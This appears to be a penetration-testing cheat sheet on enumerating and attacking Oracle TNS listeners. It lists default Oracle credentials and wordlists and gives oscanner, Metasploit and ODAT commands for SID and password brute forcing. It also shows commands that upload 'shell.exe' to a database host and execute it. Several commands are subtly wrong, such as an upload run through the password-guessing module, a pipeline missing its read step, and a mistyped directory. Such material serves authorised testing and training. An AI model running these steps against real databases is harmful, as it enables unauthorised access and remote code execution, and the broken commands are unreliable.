# Oracle TNS Listener - 1521,1522,1529

## Oracle Information

Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from [here](https://www.techopedia.com/definition/8711/oracle-database)).

When enumerating Oracle, the first step is to contact the TNS-Listener, which is normally found on the default port (1521/TCP; secondary listeners can be found on ports 1522–1529).

```
1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```

## SQLPlus Authentication

To login using known credentials:

```
sqlplus <username>/<password>@<ip_address>/<SID>;
```

If the TNS Listener is on a non-default port (e.g. TCP/1522) :

```
sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
```

If an **account has system database privileges (sysdba) or system operator (sysop)** you may wish to try the following:

```bash
sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
```

## **SID Bruteforce**

In order to use **oracle\_login** with **patator** you need to **install**:

```
pip3 install cx_Oracle --upgrade
```

### **Default Passwords**

Below are some of the default passwords associated with Oracle:

* **DBSNMP/DBSNMP** — Intelligent Agent uses this to talk to the db server (its some work to change it)
* **SYS/CHANGE\_ON\_INSTALL** — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
* **PCMS\_SYS/PCMS\_SYS** — Default x account
* **WMSYS/WMSYS** — Default x account
* **OUTLN/OUTLN** — Default x account
* **SCOTT/TIGER** — Default x account

### User/Pass bruteforce

Different tools offered **different user/pass lists** for oracle:

* **oscan:** _/usr/share/oscanner/accounts.default_ (169 lines)
* **MSF-1:**  _from_ admin/oracle/oracle\_login  __  /usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv (598 lines)
* **MSF-2:** _from scanner/oracle/oracle\_login_  _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ (568 lines)
* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ (687 lines)

## oscanner

**Oscanner**, which will try to get some valid SID, and then it will brute-force for valid credentials and try to extract some information:

```bash
#apt install oscanner
oscanner -s <IP> -P <PORT>
```

## ODAT

{% embed url="https://github.com/quentinhardy/odat" %}

**ODAT** (Oracle Database Attacking Tool) is an open-source **penetration testing** tool that tests the security of **Oracle Databases remotely**.

Usage examples of ODAT:

* You have an Oracle database listening remotely and want to find valid **SIDs** and **credentials** in order to connect to the database
* You have a valid Oracle account on a database and want to **escalate your privileges** to become DBA or SYSDBA
* You have an Oracle account and you want to **execute system commands** (e.g. **reverse shell**) in order to move forward on the operating system hosting the database

Tested on Oracle Database **10g**, **11g**, **12c**, **18c,** and **19c**.

Your Oracle version:

```
ls /usr/local/lib/oracle
```

Wiki of ODAT:

{% embed url="https://github.com/quentinhardy/odat/wiki" %}

### Install ODAT

We can install ODAT with the following commands:

```
git clone https://github.com/quentinhardy/odat
cd odat
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
pip3 install cx_Oracle
```

As the victim machine is 64 bits, we downloaded the client basic SDK and SQLPlus from the Oracle website

```
mkdir isolation
cd isolation
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-basic-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-sqlplus-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-devel-21.1.0.0.0-1.x86_64.rpm
```

Now we convert the `.rpm` files into `.deb` files and install them:

```
alien --to-deb *.rpm
dpkg -i *.deb
```

We add the environment variables to the `.zshrc`:

```
ls /usr/lib/oracle

#Output
21

vi ~/.zshrc

export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```

Let's check that everything has been installed well:

```
sqlplus64
python3 odat.py --help
```

### Identify SIDs

We can attempt to identify SIDs:

```bash
odat sidguesser -s 10.10.10.82
```

Alternatively, we can use metasploits sid_brute:

```
msf auxiliary(admin/oracle/sid_brute) > run

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
```

### Find Valid Credentials

You can do SID guessing attack with the following command:

```
python3 odat.py sidguesser -s <IP>
```

Dictionary

```
/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv | tr ' ' '/' | tail -n 50 > passwords.txt
```

After finding a valid SID:

```
python3 odat.py passwordguesser -s <IP> -d <SID> --accounts-file passwords.txt
```

### Upload Files

```
# No sysdba
python3 odat.py passwordguesser -s <IP> -d <SID> -U "username" -P "password" --putFile /Temp shell.exe shell.exe
# Use sysdba
python3 odat.py passwordguesser -s <IP> -d <SID> -U "username" -P "password" --putFile /Temp shell.exe shell.exe --sysdba
```

### Execute Commands

```
# No sysdba
python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe
# Use sysdba
python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe --sysdba
# Alternatively
./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"

```

Generalized:

```bash
git clone https://github.com/quentinhardy/odat.git
cd oda
pip3 install python-libnmap
pip3 install cx_oracle
python3 odat.py all -s <IP> -p <PORT>
```
